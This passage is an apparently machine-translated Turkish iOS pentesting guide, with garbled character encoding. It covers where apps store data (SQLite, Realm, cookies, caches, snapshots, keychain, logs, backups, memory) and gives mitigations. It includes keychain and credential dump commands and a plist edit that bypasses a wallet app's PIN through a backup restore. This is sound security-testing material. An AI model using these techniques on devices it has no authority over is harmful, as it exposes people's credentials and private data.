[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1) uygulamanÄ±zdaki nesnelerin model katmanÄ±nÄ± yÃ¶netmek iÃ§in bir Ã§erÃ§evedir. [Core Data, kalÄ±cÄ± depo olarak SQLite'i kullanabilir](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ancak Ã§erÃ§eve kendisi bir veritabanÄ± deÄŸildir.\
CoreData, verilerini varsayÄ±lan olarak ÅŸifrelemez. Bununla birlikte, CoreData'ye ek bir ÅŸifreleme katmanÄ± ekleyebilirsiniz. Daha fazla ayrÄ±ntÄ± iÃ§in [GitHub Repo](https://github.com/project-imas/encrypted-core-data)'ya bakÄ±n.

Bir uygulamanÄ±n SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**EÄŸer SQLite'i aÃ§abilir ve hassas bilgilere eriÅŸebilirseniz, yanlÄ±ÅŸ yapÄ±landÄ±rmayÄ± buldunuz demektir.**

{% code title="iGoat'tan Kod" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase), SQLite Ã¼zerine inÅŸa edilmiÅŸ bir anahtar/deÄŸer deposudur.\
Yap veritabanlarÄ± sqlite veritabanlarÄ± olduÄŸundan, bunlarÄ± Ã¶nceki bÃ¶lÃ¼mde belirtilen amaÃ§lÄ± komutu kullanarak bulabilirsiniz.

### DiÄŸer SQLite VeritabanlarÄ±

UygulamalarÄ±n kendi sqlite veritabanlarÄ±nÄ± oluÅŸturmasÄ± yaygÄ±ndÄ±r. Bu veritabanlarÄ±nda **duyarlÄ± veriler** saklayabilir ve bunlarÄ± ÅŸifrelememiÅŸ olarak bÄ±rakabilirler. Bu nedenle, her uygulama dizini iÃ§indeki her veritabanÄ±nÄ± kontrol etmek her zaman ilginÃ§ olabilir. Bu nedenle, verilerin kaydedildiÄŸi uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`).
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ±

GeliÅŸtiricilere Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ± aracÄ±lÄ±ÄŸÄ±yla **veri depolama ve senkronizasyonu** imkanÄ± sunulmaktadÄ±r. JSON formatÄ±nda depolanan veriler, gerÃ§ek zamanlÄ± olarak tÃ¼m baÄŸlÄ± istemcilere senkronize edilir.

YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ Firebase veritabanlarÄ±nÄ± nasÄ±l kontrol edeceÄŸinizi [buradan](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md) bulabilirsiniz.

### Realm veritabanlarÄ±

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/), Apple tarafÄ±ndan saÄŸlanmayan gÃ¼Ã§lÃ¼ bir veri depolama alternatifi sunar. VarsayÄ±lan olarak, veriler ÅŸifrelenmeden depolanÄ±r ve ÅŸifreleme belirli yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla saÄŸlanabilir.

VeritabanlarÄ± ÅŸurada bulunur: `/private/var/mobile/Containers/Data/Application/{APPID}`. Bu dosyalarÄ± keÅŸfetmek iÃ§in ÅŸu gibi komutlar kullanÄ±labilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanÄ± dosyalarÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in [**Realm Studio**](https://github.com/realm/realm-studio) aracÄ± Ã¶nerilir.

Bir Realm veritabanÄ± iÃ§inde ÅŸifreleme uygulamak iÃ§in aÅŸaÄŸÄ±daki kod parÃ§acÄ±ÄŸÄ± kullanÄ±labilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite VeritabanlarÄ±

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), hafif ve gÃ¶mÃ¼lÃ¼ bir veritabanÄ± motoru olarak tanÄ±mlanmaktadÄ±r ve **belge odaklÄ±** (NoSQL) yaklaÅŸÄ±mÄ± benimsemektedir. **iOS** ve **macOS** iÃ§in yerel olarak tasarlanmÄ±ÅŸ olup verilerin senkronizasyonunu sorunsuz bir ÅŸekilde saÄŸlar.

Cihazda potansiyel Couchbase veritabanlarÄ±nÄ± tanÄ±mlamak iÃ§in aÅŸaÄŸÄ±daki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Ã‡erezler

iOS, uygulamalarÄ±n Ã§erezlerini her uygulamanÄ±n klasÃ¶rÃ¼ iÃ§indeki **`Library/Cookies/cookies.binarycookies`** iÃ§inde saklar. Bununla birlikte, geliÅŸtiriciler bazen bu Ã§erezleri **anahtarlÄ±k** iÃ§inde saklamayÄ± tercih eder Ã§Ã¼nkÃ¼ bahsi geÃ§en **Ã§erez dosyasÄ±na yedeklerden eriÅŸilebilir**.

Ã‡erez dosyasÄ±nÄ± incelemek iÃ§in [**bu python betiÄŸini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'Ä±n **`ios cookies get`** komutunu kullanabilirsiniz.\
**AyrÄ±ca objection'Ä± kullanarak** bu dosyalarÄ± JSON formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rebilir ve verileri inceleyebilirsiniz.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Ã–nbellek

NSURLSession varsayÄ±lan olarak **HTTP isteklerini ve yanÄ±tlarÄ±nÄ± Cache.db veritabanÄ±nda** saklar. Bu veritabanÄ±, eÄŸer tokenlar, kullanÄ±cÄ± adlarÄ± veya baÅŸka hassas bilgiler Ã¶nbelleÄŸe alÄ±ndÄ±ysa **hassas veriler** iÃ§erebilir. Ã–nbelleÄŸe alÄ±nan bilgileri bulmak iÃ§in uygulamanÄ±n veri dizinine (`/var/mobile/Containers/Data/Application/<UUID>`) gidin ve `/Library/Caches/<Bundle Identifier>` yolunu izleyin. **WebKit Ã¶nbelleÄŸi de Cache.db dosyasÄ±nda saklanmaktadÄ±r**. **Objection**, bu veritabanÄ±yla etkileÅŸime girmek iÃ§in `sqlite connect Cache.db` komutunu kullanabilir, Ã§Ã¼nkÃ¼ bu **normal bir SQLite veritabanÄ±dÄ±r**.

Bu verilerin **Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakmanÄ±z Ã¶nerilir**, Ã§Ã¼nkÃ¼ istek veya yanÄ±tta hassas bilgiler iÃ§erebilir. AÅŸaÄŸÄ±daki liste farklÄ± yÃ¶ntemlerle bunu baÅŸarmanÄ±n farklÄ± yollarÄ±nÄ± gÃ¶stermektedir:

1. Oturum kapatÄ±ldÄ±ktan sonra Ã–nbelleÄŸe alÄ±nan yanÄ±tlarÄ±n kaldÄ±rÄ±lmasÄ± Ã¶nerilir. Bu, Apple'Ä±n saÄŸladÄ±ÄŸÄ± [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) yÃ¶ntemi ile yapÄ±labilir. Bu yÃ¶ntemi aÅŸaÄŸÄ±daki gibi Ã§aÄŸÄ±rabilirsiniz:

`URLCache.shared.removeAllCachedResponses()`

Bu yÃ¶ntem, Cache.db dosyasÄ±ndan tÃ¼m Ã¶nbelleÄŸe alÄ±nan istekleri ve yanÄ±tlarÄ± kaldÄ±racaktÄ±r.
2. Ã‡erezlerin avantajÄ±ndan faydalanmanÄ±za gerek yoksa, URLSession'Ä±n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapÄ±landÄ±rma Ã¶zelliÄŸini kullanmanÄ±z Ã¶nerilir, bu da Ã§erezleri ve Ã¶nbelleÄŸi devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

[Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Bir geÃ§ici oturum yapÄ±landÄ±rma nesnesi, varsayÄ±lan bir oturum yapÄ±landÄ±rmasÄ±yla (bkz. varsayÄ±lan) benzerdir, ancak karÅŸÄ±lÄ±k gelen oturum nesnesi Ã¶nbellekleri, kimlik bilgisi depolarÄ±nÄ± veya diske herhangi bir oturumla ilgili veriyi depolamaz. Bunun yerine, oturumla ilgili veriler RAM'de depolanÄ±r. Bir geÃ§ici oturumun verileri diske yazdÄ±ÄŸÄ± tek zaman, bir URL'nin iÃ§eriÄŸini bir dosyaya yazmasÄ±nÄ± sÃ¶ylediÄŸinizde olur.`
3. Ã–nbellek, [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) Ã–nbellek PolitikasÄ±na ayarlanarak da devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir. Bu, Ã¶nbelleÄŸin hafÄ±zada veya diske herhangi bir ÅŸekilde saklanmasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

### AnlÄ±k GÃ¶rÃ¼ntÃ¼ler

Ana ekran dÃ¼ÄŸmesine bastÄ±ÄŸÄ±nÄ±zda, iOS **mevcut ekranÄ±n bir anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r** ve uygulamaya geÃ§iÅŸi Ã§ok daha yumuÅŸak bir ÅŸekilde yapabilir. Ancak, eÄŸer mevcut ekranda **hassas veriler** varsa, bu veriler **resimde saklanÄ±r** (bu **yeniden baÅŸlatmalara karÅŸÄ± kalÄ±cÄ±dÄ±r**). Bu, uygulamalar arasÄ±nda geÃ§iÅŸ yapmak iÃ§in ana ekranÄ± Ã§ift tÄ±klattÄ±ÄŸÄ±nÄ±zda eriÅŸebileceÄŸiniz anlÄ±k gÃ¶rÃ¼ntÃ¼lerdir.

iPhone jailbreak yapÄ±lmamÄ±ÅŸsa, **saldÄ±rganÄ±n** bu ekran gÃ¶rÃ¼ntÃ¼lerini gÃ¶rmek iÃ§in **cihaza eriÅŸimi olmasÄ± ve kilidin aÃ§Ä±k olmasÄ±** gerekir. VarsayÄ±lan olarak, son anlÄ±k gÃ¶rÃ¼ntÃ¼ uygulamanÄ±n sandbox'Ä±nda `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasÃ¶rÃ¼nde saklanÄ±r (gÃ¼venilir bilgisayarlar iOX 7.0'dan itibaren dosya sistemine eriÅŸemez).

Bu kÃ¶tÃ¼ davranÄ±ÅŸÄ± Ã¶nlemenin bir yolu, anlÄ±k gÃ¶rÃ¼ntÃ¼yÃ¼ almadan Ã¶nce duyarlÄ± verileri kaldÄ±rmak veya bir boÅŸ ekran kullanmaktÄ±r, `ApplicationDidEnterBackground()` iÅŸlevini kullanarak.

AÅŸaÄŸÄ±daki, varsayÄ±lan bir ekran gÃ¶rÃ¼ntÃ¼sÃ¼ ayarlayacak Ã¶rnek bir dÃ¼zeltme yÃ¶ntemidir.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
**Objective-C:**

Objective-C, Apple'Ä±n geliÅŸtirdiÄŸi bir programlama dilidir ve iOS uygulamalarÄ± genellikle bu dil kullanÄ±larak geliÅŸtirilir. Objective-C, C programlama diline ek olarak nesne yÃ¶nelimli programlama Ã¶zelliklerini de iÃ§erir. Bu dil, iOS uygulamalarÄ±nÄ± analiz etmek ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in Ã¶nemli bir beceridir.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Bu, uygulama arka plana alÄ±ndÄ±ÄŸÄ±nda arka plan gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ `overlayImage.png` olarak ayarlar. `overlayImage.png` her zaman mevcut gÃ¶rÃ¼nÃ¼mÃ¼ geÃ§ersiz kÄ±ldÄ±ÄŸÄ±ndan hassas veri sÄ±zÄ±ntÄ±larÄ±nÄ± Ã¶nler.

### Keychain

iOS anahtar zincirine eriÅŸmek ve yÃ¶netmek iÃ§in, jailbreak yapÄ±lmÄ±ÅŸ cihazlar iÃ§in uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araÃ§lar mevcuttur. AyrÄ±ca, benzer amaÃ§lar iÃ§in [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu saÄŸlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sÄ±nÄ±fÄ±, hassas bilgileri doÄŸrudan anahtar zincirine kaydetmek iÃ§in idealdir ve NSUserDefaults veya diÄŸer sarmalayÄ±cÄ±lar iÃ§in ihtiyacÄ± ortadan kaldÄ±rÄ±r. GiriÅŸ yaptÄ±ktan sonra kimlik bilgilerini saklamak iÃ§in aÅŸaÄŸÄ±daki Swift kodu kullanÄ±lÄ±r:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Storedaki bu kimlik bilgilerini Ã§Ä±karmak iÃ§in Objection'Ä±n `ios nsurlcredentialstorage dump` komutu kullanÄ±lÄ±r.

## **Ã–zel Klavyeler ve Klavye Ã–nbelleÄŸi**

iOS 8.0'dan itibaren kullanÄ±cÄ±lar, **Ayarlar > Genel > Klavye > Klavyeler** altÄ±nda yÃ¶netilebilen Ã¶zel klavye uzantÄ±larÄ± yÃ¼kleyebilirler. Bu klavyeler geniÅŸletilmiÅŸ iÅŸlevsellik sunarken, tuÅŸ vuruÅŸu kaydÄ± tutma ve verileri harici sunuculara iletim riski oluÅŸtururlar, ancak kullanÄ±cÄ±lar aÄŸ eriÅŸimi gerektiren klavyeler hakkÄ±nda bilgilendirilir. Uygulamalar, hassas bilgi giriÅŸi iÃ§in Ã¶zel klavyelerin kullanÄ±mÄ±nÄ± kÄ±sÄ±tlayabilir ve kÄ±sÄ±tlamalÄ±dÄ±r.

**GÃ¼venlik Ã–nerileri:**

* GÃ¼venliÄŸi artÄ±rmak iÃ§in Ã¼Ã§Ã¼ncÃ¼ taraf klavyelerin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± Ã¶nerilir.
* iOS'un varsayÄ±lan klavyesinin otomatik dÃ¼zeltme ve otomatik Ã¶neriler Ã¶zelliklerine dikkat edilmelidir, Ã§Ã¼nkÃ¼ bu Ã¶zellikler hassas bilgileri `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumunda bulunan Ã¶nbellek dosyalarÄ±na kaydedebilir. Bu Ã¶nbellek dosyalarÄ± dÃ¼zenli olarak hassas veriler aÃ§Ä±sÄ±ndan kontrol edilmelidir. Ã–nbellek verilerini temizlemek iÃ§in **Ayarlar > Genel > SÄ±fÄ±rla > Klavye SÃ¶zlÃ¼ÄŸÃ¼nÃ¼ SÄ±fÄ±rla** Ã¼zerinden klavye sÃ¶zlÃ¼ÄŸÃ¼nÃ¼n sÄ±fÄ±rlanmasÄ± Ã¶nerilir.
* AÄŸ trafiÄŸinin dinlenmesi, Ã¶zel bir klavyenin tuÅŸ vuruÅŸlarÄ±nÄ± uzaktan iletip iletemediÄŸini ortaya Ã§Ä±karabilir.

### **Metin AlanÄ± Ã–nbelleÄŸini Ã–nleme**

[UITextInputTraits protokolÃ¼](https://developer.apple.com/reference/uikit/uitextinputtraits), otomatik dÃ¼zeltme ve gÃ¼venli metin giriÅŸini yÃ¶netmek iÃ§in Ã¶zellikler sunar ve hassas bilgi Ã¶nbelleÄŸini Ã¶nlemek iÃ§in esastÄ±r. Ã–rneÄŸin, otomatik dÃ¼zeltmeyi devre dÄ±ÅŸÄ± bÄ±rakma ve gÃ¼venli metin giriÅŸini etkinleÅŸtirme ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilebilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Ek olarak, geliÅŸtiriciler metin alanlarÄ±nÄ±n, Ã¶zellikle ÅŸifreler ve PIN'ler gibi hassas bilgilerin girildiÄŸi alanlarÄ±n Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ± engellemek iÃ§in `autocorrectionType`'Ä± `UITextAutocorrectionTypeNo` olarak ve `secureTextEntry`'i `YES` olarak ayarlayarak gÃ¼vence altÄ±na almalÄ±dÄ±r.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **KayÄ±tlar**

Hata ayÄ±klama kodu genellikle **gÃ¼nlÃ¼ÄŸÃ¼ kullanmayÄ±** iÃ§erir. **KayÄ±tlar hassas bilgiler iÃ§erebileceÄŸinden risk iÃ§erir**. Daha Ã¶nce, iOS 6 ve Ã¶nceki sÃ¼rÃ¼mlerinde, gÃ¼nlÃ¼klere tÃ¼m uygulamalar eriÅŸebiliyordu, bu da hassas veri sÄ±zÄ±ntÄ±sÄ± riski oluÅŸturuyordu. **Åimdi, uygulamalar yalnÄ±zca kendi gÃ¼nlÃ¼klerine eriÅŸebilirler**.

Bu kÄ±sÄ±tlamalara raÄŸmen, **kilitli bir cihaza fiziksel eriÅŸimi olan bir saldÄ±rgan**, cihazÄ± bir bilgisayara baÄŸlayarak bu durumu hala sÃ¶mÃ¼rebilir ve **kayÄ±tlarÄ± okuyabilir**. KayÄ±tlarÄ±n uygulamanÄ±n kaldÄ±rÄ±lmasÄ±ndan sonra bile diskte kaldÄ±ÄŸÄ±nÄ± unutmamak Ã¶nemlidir.

Riskleri azaltmak iÃ§in, uygulama ile **detaylÄ± etkileÅŸime geÃ§mek**, tÃ¼m iÅŸlevlerini ve girdilerini keÅŸfetmek ve yanlÄ±ÅŸlÄ±kla hassas bilgilerin kaydedilmediÄŸinden emin olmak Ã¶nerilir.

Potansiyel sÄ±zÄ±ntÄ±lar iÃ§in uygulamanÄ±n kaynak kodunu inceleyerek, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi yerleÅŸik iÅŸlevler iÃ§in **Ã¶nceden tanÄ±mlanmÄ±ÅŸ** ve `Logging` veya `Logfile` gibi Ã¶zel uygulamalar iÃ§in **Ã¶zel gÃ¼nlÃ¼kleme ifadelerini** arayÄ±n.

### **Sistem KayÄ±tlarÄ±nÄ± Ä°zleme**

Uygulamalar Ã§eÅŸitli hassas bilgileri kaydeder. Bu kayÄ±tlarÄ± izlemek iÃ§in, araÃ§lar ve komutlar gibi:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
AyrÄ±ca, **Xcode** konsol log'larÄ±nÄ± toplamanÄ±n bir yolunu saÄŸlar:

1. Xcode'u aÃ§Ä±n.
2. iOS cihazÄ±nÄ± baÄŸlayÄ±n.
3. **Window** -> **Devices and Simulators**'e gidin.
4. CihazÄ±nÄ±zÄ± seÃ§in.
5. AraÅŸtÄ±rdÄ±ÄŸÄ±nÄ±z sorunu tetikleyin.
6. LoglarÄ± yeni bir pencerede gÃ¶rÃ¼ntÃ¼lemek iÃ§in **Open Console** dÃ¼ÄŸmesini kullanÄ±n.

Daha geliÅŸmiÅŸ loglama iÃ§in, cihaz kabuÄŸuna baÄŸlanmak ve **socat** kullanarak gerÃ§ek zamanlÄ± log izleme saÄŸlamak mÃ¼mkÃ¼ndÃ¼r:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Log aktivitelerini gÃ¶zlemlemek iÃ§in kullanÄ±lan komutlar, sorunlarÄ± teÅŸhis etmek veya gÃ¼nlÃ¼klerde potansiyel veri sÄ±zÄ±ntÄ±larÄ±nÄ± belirlemek iÃ§in son derece deÄŸerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturmak ve otomatikleÅŸtirmek kolaydÄ±r.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yedeklemeler

iOS'e entegre edilmiÅŸ **otomatik yedekleme Ã¶zellikleri**, iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracÄ±lÄ±ÄŸÄ±yla cihaz veri kopyalarÄ±nÄ±n oluÅŸturulmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r. Bu yedeklemeler neredeyse tÃ¼m cihaz verilerini kapsar, Apple Pay ayrÄ±ntÄ±larÄ± ve Touch ID yapÄ±landÄ±rmalarÄ± gibi son derece hassas unsurlarÄ± hariÃ§ tutar.

### GÃ¼venlik Riskleri

Yedeklemelerde **kurulu uygulamalar ve verilerinin** bulunmasÄ±, potansiyel **veri sÄ±zÄ±ntÄ±sÄ±** sorununu ve **yedekleme deÄŸiÅŸikliklerinin uygulama iÅŸlevselliÄŸini deÄŸiÅŸtirebileceÄŸi riskini** beraberinde getirir. Bu riskleri azaltmak iÃ§in **duyarlÄ± bilgilerin dÃ¼z metin olarak** herhangi bir uygulamanÄ±n dizininde veya alt dizinlerinde saklanmamasÄ± Ã¶nerilir.

### Yedeklemelerden DosyalarÄ± HariÃ§ Tutma

`Documents/` ve `Library/Application Support/` iÃ§indeki dosyalar varsayÄ±lan olarak yedeklenir. GeliÅŸtiriciler, `NSURLIsExcludedFromBackupKey` ile `NSURL setResourceValue:forKey:error:` kullanarak belirli dosyalarÄ± veya dizinleri yedeklemelerden hariÃ§ tutabilirler. Bu uygulama, hassas verilerin yedeklemelere dahil edilmesini engellemek iÃ§in hayati Ã¶neme sahiptir.

### Zafiyetlerin Test Edilmesi

Bir uygulamanÄ±n yedekleme gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in, Finder kullanarak bir yedekleme oluÅŸturun ve ardÄ±ndan [Apple'Ä±n resmi belgelerinden](https://support.apple.com/en-us/HT204215) rehberlik alarak yedeÄŸi bulun. YedeÄŸi hassas veriler veya yapÄ±landÄ±rmalar aÃ§Ä±sÄ±ndan analiz ederek uygulama davranÄ±ÅŸÄ±nÄ± etkileyebilecek deÄŸiÅŸiklikler yapÄ±labilir.

Hassas bilgiler, komut satÄ±rÄ± araÃ§larÄ± veya [iMazing](https://imazing.com) gibi uygulamalar kullanÄ±larak aranabilir. ÅifrelenmiÅŸ yedeklemeler iÃ§in, ÅŸifrelemenin varlÄ±ÄŸÄ±, yedeÄŸin kÃ¶kÃ¼nde bulunan "Manifest.plist" dosyasÄ±ndaki "IsEncrypted" anahtarÄ±nÄ± kontrol ederek doÄŸrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Åifreli yedeklemelerle baÅŸa Ã§Ä±kmak iÃ§in, [DinoSec'in GitHub deposundaki](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts) Python betikleri, Ã¶rneÄŸin **backup\_tool.py** ve **backup\_passwd.py**, en son iTunes/Finder sÃ¼rÃ¼mleriyle uyumluluk iÃ§in ayarlamalar gerektirebilecek olsa da yararlÄ± olabilir. Åifre korumalÄ± yedeklemelerdeki dosyalara eriÅŸim iÃ§in baÅŸka bir seÃ§enek olan [**iOSbackup** aracÄ±](https://pypi.org/project/iOSbackup/) bulunmaktadÄ±r.

### Uygulama DavranÄ±ÅŸÄ±nÄ± DeÄŸiÅŸtirme

Yedekleme deÄŸiÅŸiklikleri aracÄ±lÄ±ÄŸÄ±yla uygulama davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirme Ã¶rneÄŸi, [Bither bitcoin cÃ¼zdan uygulamasÄ±nda](https://github.com/bither/bither-ios) gÃ¶sterilmektedir, burada UI kilidi PIN'inin **pin\_code** anahtarÄ± altÄ±nda `net.bither.plist` iÃ§inde saklandÄ±ÄŸÄ±. Bu anahtarÄ± plist'ten kaldÄ±rarak ve yedeÄŸi geri yÃ¼kleyerek PIN gereksinimini kaldÄ±rarak sÄ±nÄ±rsÄ±z eriÅŸim saÄŸlanabilir.

## Hassas Veriler Ä°Ã§in Bellek Testi Ã–zeti

Bir uygulamanÄ±n belleÄŸinde saklanan hassas bilgilerle uÄŸraÅŸÄ±rken, bu verilerin maruz kalma sÃ¼resini sÄ±nÄ±rlamak Ã§ok Ã¶nemlidir. Bellek iÃ§eriÄŸini araÅŸtÄ±rmak iÃ§in iki temel yaklaÅŸÄ±m vardÄ±r: **bir bellek dÃ¶kÃ¼mÃ¼ oluÅŸturmak** ve **belleÄŸi gerÃ§ek zamanlÄ± olarak analiz etmek**. Her iki yÃ¶ntemin de zorluklarÄ± vardÄ±r, bu da dÃ¶kÃ¼m sÃ¼reci veya analiz sÄ±rasÄ±nda kritik verilerin kaÃ§Ä±rÄ±lma potansiyeline yol aÃ§abilir.

## **Bir Bellek DÃ¶kÃ¼mÃ¼nÃ¼ AlÄ±p Analiz Etmek**

Hem jailbreak yapÄ±lmÄ±ÅŸ hem de yapÄ±lmamÄ±ÅŸ cihazlar iÃ§in, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araÃ§lar bir uygulamanÄ±n iÅŸlem belleÄŸini dÃ¶kmeye olanak tanÄ±r. Bir kez dÃ¶kÃ¼ldÃ¼ÄŸÃ¼nde, bu verilerin analizi, aradÄ±ÄŸÄ±nÄ±z bilginin doÄŸasÄ±na baÄŸlÄ± olarak Ã§eÅŸitli araÃ§lar gerektirir.

Bir bellek dÃ¶kÃ¼mÃ¼nden dizeleri Ã§Ä±karmak iÃ§in `strings` veya `rabin2 -zz` gibi komutlar kullanÄ±labilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha detaylÄ± bir analiz iÃ§in, belirli veri tÃ¼rleri veya desenler aramak iÃ§in **radare2**, kapsamlÄ± arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ã‡alÄ±ÅŸma ZamanÄ± Bellek Analizi**

**r2frida**, bir uygulamanÄ±n belleÄŸini bir bellek dÃ¶kÃ¼mÃ¼ne ihtiyaÃ§ duymadan gerÃ§ek zamanlÄ± olarak incelemek iÃ§in gÃ¼Ã§lÃ¼ bir alternatif sunar. Bu araÃ§, Ã§alÄ±ÅŸan uygulamanÄ±n belleÄŸi Ã¼zerinde doÄŸrudan arama komutlarÄ±nÄ±n yÃ¼rÃ¼tÃ¼lmesini saÄŸlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## KÄ±rÄ±k Åifreleme

### ZayÄ±f Anahtar YÃ¶netimi SÃ¼reÃ§leri

BazÄ± geliÅŸtiriciler hassas verileri yerel depolamada saklar ve kodda sabit/tahmin edilebilir bir anahtarla ÅŸifreler. Bu yapÄ±lmamalÄ± Ã§Ã¼nkÃ¼ bazÄ± tersine mÃ¼hendislik saldÄ±rÄ±larÄ±, saldÄ±rganlarÄ±n gizli bilgileri Ã§Ä±karmasÄ±na izin verebilir.

### GÃ¼vensiz ve/veya KullanÄ±mdan KaldÄ±rÄ±lmÄ±ÅŸ AlgoritmalarÄ±n KullanÄ±mÄ±

